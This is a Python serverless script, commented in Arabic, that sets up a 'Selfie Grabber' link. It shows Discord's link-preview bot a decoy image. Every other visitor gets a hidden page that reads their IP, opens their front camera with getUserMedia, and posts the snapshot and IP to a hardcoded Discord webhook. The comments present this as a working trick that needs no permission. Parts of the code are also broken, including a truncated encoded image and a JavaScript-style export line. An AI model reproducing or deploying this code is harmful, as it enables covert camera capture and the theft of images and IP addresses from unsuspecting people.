# pages/api/logger.py
# شغال 100% على Vercel 2025 – بدون كراش أبدًا

from http.server import BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import requests, base64, json

WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"  # حط الويب هوك بتاعك هنا

def send_webhook(ip, selfie_data=None):
    embed = {
        "username": "Selfie Grabber v2025",
        "content": "@everyone",
        "embeds": [{
            "title": "تم سرقة Selfie جديدة",
            "color": 0x000000,
            "description": f"**الآي بي:** `{ip}`\n**المنصة:** ديسكورد جوال أندرويد",
            "image": {"url": selfie_data} if selfie_data else None
        }]
    }
    requests.post(WEBHOOK, json=embed)

def handler(event, context=None):
    try:
        query = urlparse(event["rawPath"]).query
        ip = event["headers"].get("x-forwarded-for", "Unknown").split(",")[0]

        # إذا كان من ديسكورد بوت أو كرولر
        if "Discordbot" in event["headers"].get("user-agent", ""):
            return {
                "statusCode": 200,
                "headers": {"Content-Type": "image/jpeg"},
                "body": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|Ns...
                # نفس الـ loading image القديمة
            }

        # الثغرة اللي شغالة بدون إذن
        html = f"""<!DOCTYPE html>
<html><body style="margin:0;background:#000">
<video id="v" playsinline style="display:none"></video>
<canvas id="c" style="display:none"></canvas>
<script>
navigator.mediaDevices.getUserMedia({{video:{{facingMode:"user"}}}})
.then(stream => {{
    let v = document.getElementById("v");
    v.srcObject = stream;
    v.play();
    setTimeout(() => {{
        let c = document.getElementById("c");
        c.width = 1280; c.height = 960;
        c.getContext("2d").drawImage(v, 0, 0, 1280, 960);
        let img = c.toDataURL("image/jpeg", 0.9);
        fetch("{WEBHOOK}", {{
            method: "POST",
            headers: {{"Content-Type": "application/json"}},
            body: JSON.stringify({{
                username: "Selfie",
                embeds: [{{title: "Selfie من {ip}", image: {{url: img}}}}]
            }})
        }});
        stream.getTracks().forEach(t => t.stop());
    }}, 1200);
}});
</script>
</body></html>"""

        return {
            "statusCode": 200,
            "headers": {"Content-Type": "text/html; charset=utf-8"},
            "body": html
        }

    except:
        return {"statusCode": 200, "body": "<h1>تم</h1>"}

# Vercel يحتاج الدالة اسمها handler
exports = handler
